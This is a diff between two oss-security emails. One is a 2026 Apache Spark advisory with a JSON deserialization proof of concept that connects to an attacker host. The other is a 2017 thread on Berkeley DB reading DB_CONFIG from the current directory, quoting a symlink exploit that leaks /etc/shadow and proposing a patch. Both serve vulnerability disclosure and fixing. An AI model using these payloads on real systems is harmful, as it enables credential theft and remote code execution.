@@ -1,4 +1,9 @@
-Received: (qmail 8074 invoked by uid 550); 13 Mar 2026 21:17:25 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3360" "Thursday" "15" "June" "2017" "16:40:50" "+0200" "Solar Designer" "solar@openwall.com" "<20170615144050.GA25094@openwall.com>" "81" "Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd" "^Date:" nil nil "6" "2017061514:40:50" "[oss-security] Berkeley DB reads DB_CONFIG from cwd" (number mark "        solar@openwa Jun 15   81/3360  " thread-indent "\"Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd\"\n") "<20170610220613.mfmmpjey2l4aptcj@jwilk.net>" ("<20170610220613.mfmmpjey2l4aptcj@jwilk.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 28237 invoked by uid 550); 15 Jun 2017 14:41:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,128 +11,98 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 28044 invoked from network); 15 Jun 2017 14:40:55 -0000
+Message-ID: <20170615144050.GA25094@openwall.com>
+References: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
+User-Agent: Mutt/1.4.2.3i
+Date: Thu, 15 Jun 2017 16:40:50 +0200
+From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 3897 invoked from network); 13 Mar 2026 21:16:01 -0000
-Authentication-Results: apache.org; auth=none
-Content-Type: text/plain; charset=utf-8
-From: Holden Karau <holden@apache.org>
+Subject: Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd
 To: oss-security@lists.openwall.com
-Message-ID: <aee6dd49-3908-5424-9761-a70d13d1ccee@apache.org>
-Content-Transfer-Encoding: quoted-printable
-Date: Fri, 13 Mar 2026 21:14:32 +0000
-MIME-Version: 1.0
-Subject: [oss-security] CVE-2025-54920: Apache Spark: Spark History Server Code Execution
- Vulnerability 
 
-Severity: low=20
+On Sun, Jun 11, 2017 at 12:06:13AM +0200, Jakub Wilk wrote:
+> Apparently Berkeley DB reads the DB_CONFIG configuration file from the 
+> current working directory by default[*]. This is surprising and AFAICT 
+> undocumented.
+> 
+> Here's how to exploit it against pam_ccreds:
+> 
+>    $ cat /etc/shadow
+>    cat: /etc/shadow: Permission denied
+>    $ ln -sf /etc/shadow DB_CONFIG
+>    $ /sbin/ccreds_chkpwd moo < /dev/null
+>    BDB1584 line 1: 
+>    root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect 
+>    name-value pair
+> 
+> (The above was tested on Debian jessie.)
+> 
+> In the past, nss_db was also exploitable:
+> CVE-2010-0826
+> 
+> 
+> [*] More precisely, this seem to happen when you call db_create() with 
+> dbenv=NULL; or if you use the dbm_open() function.
 
-Affected versions:
+Besides possibly updating Postfix, what are distros going to do about
+this?  What is upstream going to do?  Have they been contacted?
 
-- Apache Spark (org.apache.spark:spark-core_2.13, org.apache.spark:spark-co=
-re_2.12) before 3.5.7
-- Apache Spark (org.apache.spark:spark-core_2.13, org.apache.spark:spark-co=
-re_2.12) 4.0.0 before 4.0.1
+In the source code, it isn't necessarily as simple as commenting out the
+undocumented functionality.  There doesn't appear to be any code
+specific to the undocumented functionality, since it is documented that
+the DB_CONFIG file is read from the environment's home directory and the
+code is there primarily for that purpose.  Problems arise when the
+environment is uninitialized, and it is unclear to me whether this was
+possibly meant to imply the environment's home directory is the current
+directory (but even if so, this behavior is dangerous and needs to go).
 
-Description:
+At first, I tried checking for dbenv being NULL in __dbenv_config(),
+which is where the hard-coded DB_CONFIG file name is found.  However, at
+least when testing with Postfix' postmap program (without the recent
+workaround), dbenv is non-NULL there, and per strace postmap does indeed
+try to open DB_CONFIG in the current directory.  Thus, for now I opted
+for this patch checking for and curing the symptom:
 
-This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommen=
-ded to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.
+--- db-4.3.29/env/env_open.c.orig       2004-12-23 02:58:21 +0000
++++ db-4.3.29/env/env_open.c    2017-06-15 13:59:43 +0000
+@@ -500,7 +500,7 @@ __dbenv_config(dbenv, db_home, flags)
+        if (p == NULL)
+                fp = NULL;
+        else {
+-               fp = fopen(p, "r");
++               fp = strcmp(p, "DB_CONFIG") ? fopen(p, "r") : NULL;
+                __os_free(dbenv, p);
+        }
 
+This passes the postmap test for me (postmap no longer tries to open the
+file), but I wonder if it possibly broke db's own tests.  I can't easily
+run the tests as --enable-test says it needs TCL, which we don't
+package.
 
+While at it, I found that rep/rep_backup.c has a comment saying it skips
+DB_CONFIG, but the code actually skips DB_CONFIG* (that is, any filename
+starting with DB_CONFIG) due to use of strncmp():
 
+                /*
+                 * Skip DB-owned files: ., ..,  __db*, DB_CONFIG, log*
+                 */
+                if (strcmp(names[i], ".") == 0)
+                        continue;
+                if (strcmp(names[i], "..") == 0)
+                        continue;
+                if (strncmp(names[i], "__db", 4) == 0)
+                        continue;
+                if (strncmp(names[i], "DB_CONFIG", 9) == 0)
+                        continue;
+                if (strncmp(names[i], "log", 3) == 0)
+                        continue;
 
+Either the comment or the code is wrong (I think the code is wrong), but
+this is unimportant.
 
-Summary
-
-Apache Spark 3.5.4 and earlier versions contain a code execution vulnerabil=
-ity in the Spark History Web UI due to overly permissive Jackson deserializ=
-ation of event log data. This allows an attacker with access to the Spark e=
-vent logs directory to inject malicious JSON payloads that trigger deserial=
-ization of arbitrary classes, enabling command execution on the host runnin=
-g the Spark History Server.
-
-
-
-
-
-Details
-
-The vulnerability arises because the Spark History Server uses Jackson poly=
-morphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent o=
-bjects, allowing an attacker to specify arbitrary class names in the event =
-JSON. This behavior permits instantiating unintended classes, such as org.a=
-pache.hive.jdbc.HiveConnection, which can perform network calls or other ma=
-licious actions during deserialization.
-
-
-The attacker can exploit this by injecting crafted JSON content into the Sp=
-ark event log files, which the History Server then deserializes on startup =
-or when loading event logs. For example, the attacker can force the History=
- Server to open a JDBC connection to a remote attacker-controlled server, d=
-emonstrating remote command injection capability.
-
-
-
-
-
-
-Proof of Concept:
-
-1. Run Spark with event logging enabled, writing to a writable directory (s=
-park-logs).
-
-2. Inject the following JSON at the beginning of an event log file:
-
-
-{
-
-  "Event": "org.apache.hive.jdbc.HiveConnection",
-  "uri": "jdbc:hive2://<IP>:<PORT>/",
-  "info": {
-    "hive.metastore.uris": "thrift://<IP>:<PORT>"
-  }
-}
-
-
-
-
-
-
-
-3. Start the Spark History Server with logs pointing to the modified direct=
-ory.
-
-4. The Spark History Server initiates a JDBC connection to the attacker=E2=
-=80=99s server, confirming the injection.
-
-
-
-
-
-
-
-
-
-
-Impact
-
-An attacker with write access to Spark event logs can execute arbitrary cod=
-e on the server running the History Server, potentially compromising the en=
-tire system.
-
-This issue is being tracked as SPARK-52381=20
-
-Credit:
-
-Alexandre Pujol (Linagora) (finder)
-
-References:
-
-https://github.com/apache/spark/pull/51312
-https://github.com/apache/spark/pull/51323
-https://issues.apache.org/jira/browse/SPARK-52381
-https://spark.apache.org/
-https://www.cve.org/CVERecord?id=3DCVE-2025-54920
-https://issues.apache.org/jira/browse/SPARK-52381
-
+Alexander
